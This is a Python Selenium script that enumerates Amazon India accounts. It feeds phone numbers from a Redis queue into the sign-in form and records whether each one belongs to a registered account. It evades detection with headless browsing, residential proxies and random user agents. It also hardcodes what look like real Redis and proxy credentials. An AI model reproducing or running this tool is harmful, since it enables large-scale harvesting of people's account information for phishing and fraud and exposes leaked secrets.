from seleniumwire import webdriver
import random
import time
import redis
import csv
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

scrapper_id = random.randint(100000, 999999)
start_time = int(time.time() * 1000)
# Redis connection setup
redis_client = redis.Redis(
    host='redis-19800.crce179.ap-south-1-1.ec2.redns.redis-cloud.com',
    port=19800,
    decode_responses=True,
    username="default",
    password="JMPog04EGI2MVcbO3HDPC9clDNyztfBX",
)
# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Brave/91.1.25.73",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
]

# formulate the proxy url with authentication
proxies = {
    "http": f"http://geonode_1VvZ28sUKX:3860618c-044d-4622-af4e-95200f09ce05@premium-residential.geonode.com:9000",
    "https": f"http://geonode_1VvZ28sUKX:3860618c-044d-4622-af4e-95200f09ce05@premium-residential.geonode.com:9000",
}
# set selenium-wire options to use the proxy
seleniumwire_options = {
    "proxy": proxies,
}

# set Chrome options to run in headless mode
options = Options()
options.add_argument("--log-level=3")
options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
options.add_argument("--headless")
options.add_argument("--disable-gpu")
options.add_argument('--no-sandbox')
options.add_argument("--window-size=1920,1080")
# initialize the Chrome driver with service, selenium-wire options, and chrome options
driver = webdriver.Chrome(
    seleniumwire_options=seleniumwire_options,
    options=options
)
# Configure WebDriver


# Timeout settings
timeout = 10

# CSV file setup
output_file = "amazon_results.csv"
with open(output_file, mode="w", newline="") as file:
    writer = csv.writer(file)
    writer.writerow(["Phone Number", "Status"])  # Write the header row

    try:
        # Open the Amazon website
        driver.get("https://www.amazon.in")
        WebDriverWait(driver, timeout).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        # Click the Signup button
        signup_button = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((By.XPATH, "//a[@data-nav-role='signin']"))
        )
        signup_button.click()
        time.sleep(1)
        while True:
            # Pull a phone number from the Redis list (blocking call)
            result = redis_client.brpop("amazon", timeout=30)  # Adjust the timeout as needed
            if not result:
                print("No more numbers to process. Exiting.")
                end_time = int(time.time() * 1000)
                print(f"Runtime: {end_time - start_time}ms")
                break

            phone_number = result[1]  # Decode the number from bytes
            print(f"Processing phone number: {phone_number}")
            present = 0
            status = "Error"
            try:

                # Enter the phone number
                phone_input = WebDriverWait(driver, timeout).until(
                    EC.element_to_be_clickable((By.XPATH, "//input[@id='ap_email']"))
                )
                time.sleep(0.2)
                phone_input.clear()
                time.sleep(0.2)
                phone_input.send_keys(phone_number)

                # Click the Continue button
                continue_button = driver.find_element(By.XPATH, "//input[@id='continue']")
                continue_button.click()

                # Wait for the popup and check the result
                popup = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH,
                                                    "//input[@id='ap_password'] | //h1[contains(text(), 'new to Amazon')] | //h4[contains(text(), 'Incorrect')] | //h2[contains(text(), 'reset required')]"))
                )
                popup_html = popup.get_attribute("outerHTML")

                # Use the HTML content to determine the status
                if 'type="password"' in popup_html:
                    status = "Present"
                    present = 1
                elif "reset required" in popup.text:
                    status = "Present"
                    present = 2
                else:
                    status = "Absent"
                    present = 0

                print(f"Number {phone_number}: {status}: {popup_html}")
                redis_client.lpush("amazon_results", f"{scrapper_id},{phone_number},{status},{int(time.time() * 1000)}")
            except Exception as e:
                print(f"Error processing number {phone_number}: {e}")
                try:
                    close_button = driver.find_element(By.XPATH, "//a[contains(text(), 'Change')]")
                    close_button.click()
                except:
                    try:
                        driver.get("https://www.amazon.in")
                        WebDriverWait(driver, timeout).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                        # Click the Signup button
                        signup_button = WebDriverWait(driver, timeout).until(
                            EC.presence_of_element_located((By.XPATH, "//a[@data-nav-role='signin']"))
                        )
                        signup_button.click()
                        time.sleep(1)
                    except:
                        pass
                    pass
                redis_client.lpush("amazon_results", f"{scrapper_id},{phone_number},Error,{int(time.time() * 1000)}")

            finally:
                # Close the popup
                try:
                    if present == 1:
                        close_button = driver.find_element(By.XPATH, "//a[contains(text(), 'Change')]")
                        close_button.click()
                    elif present == 2:
                        driver.back()
                    # time.sleep(random.uniform(0.5, 1.5))
                except Exception as e:
                    print(f"Error closing popup for number {phone_number}: {e}")

                # Log the result in the CSV file
                writer.writerow([phone_number, status])
                # Ensure data is written to the file immediately

                # Delay before processing the next number
                time.sleep(1)

    finally:
        # Close the browser
        driver.quit()
        file.flush()
